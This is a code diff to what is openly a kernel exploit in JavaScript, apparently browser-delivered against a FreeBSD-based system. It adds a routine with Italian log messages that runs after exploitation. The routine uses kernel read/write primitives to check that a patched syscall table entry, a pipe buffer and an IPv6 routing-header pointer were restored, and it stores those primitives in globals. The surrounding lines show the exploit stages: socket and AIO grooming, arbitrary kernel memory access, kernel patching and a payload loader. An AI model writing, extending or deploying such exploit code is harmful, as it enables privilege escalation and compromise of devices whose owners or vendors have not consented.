@@ -1606,6 +1606,10 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
+
+
+   verify_post_exploit(_kmem, _kbase, _restore_info);
+
 }
 
 
@@ -1638,6 +1642,65 @@ function setup(block_fd) {
     cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
+
+
+function verify_post_exploit(kmem, kbase, restore_info) {
+    log("\n--- VERIFICA POST-EXPLOIT ---");
+
+    const offset_sysent_661 = 0x1107f00;
+    const sysent_661 = kbase.add(offset_sysent_661);
+
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
+
+    log(`sysent[661] -> sy_narg: ${sy_narg}, sy_call: ${sy_call}, sy_thrcnt: ${sy_thrcnt}`);
+    if (sy_narg === 6 && sy_thrcnt === 1) {
+        log("⚠️ sysent[661] sembra ancora patchato (non è stato ripristinato).");
+    } else {
+        log("✅ sysent[661] è stato correttamente ripristinato.");
+    }
+
+    try {
+        const [kpipe, pipe_save] = restore_info;
+
+        log("🔍 Verifica pipebuf...");
+        let mismatch = false;
+        for (let off = 0; off < pipe_save.size; off += 8) {
+            const expected = pipe_save.read64(off);
+            const actual = kmem.read64(kpipe.add(off));
+            if (!expected.eq(actual)) {
+                log(`❌ pipebuf mismatch a offset ${off.toString(16)}: got ${actual}, expected ${expected}`);
+                mismatch = true;
+            }
+        }
+        if (!mismatch) {
+            log("✅ pipebuf è integro.");
+        }
+    } catch (e) {
+        log(`⚠️ Errore nel verificare la pipebuf: ${e}`);
+    }
+
+    try {
+        const [, , , , dirty_sd] = restore_info;
+        const IPPROTO_IPV6 = 41;
+        const IPV6_RTHDR = 51;
+        const rthdr = new Buffer(8);
+        const size = new Word(rthdr.size);
+        sysi("getsockopt", dirty_sd, IPPROTO_IPV6, IPV6_RTHDR, rthdr.addr, size.addr);
+        const val = rthdr.read64(0);
+        if (val.eq(0)) {
+            log("✅ ip6po_rthdr è stato correttamente azzerato.");
+        } else {
+            log(`❌ ip6po_rthdr NON è nullo: ${val}`);
+        }
+    } catch (e) {
+        log(`⚠️ Errore nel verificare ip6po_rthdr: ${e}`);
+    }
+
+    log("--- FINE VERIFICA ---\n");
+}
+
 
 function runBinLoader() {
     var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
@@ -1760,6 +1823,12 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
+
+             globalThis._kmem = kmem;
+              globalThis._kbase = kbase;
+               globalThis._restore_info = restore_info; 
+
+                globalThis._sds = sds; 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
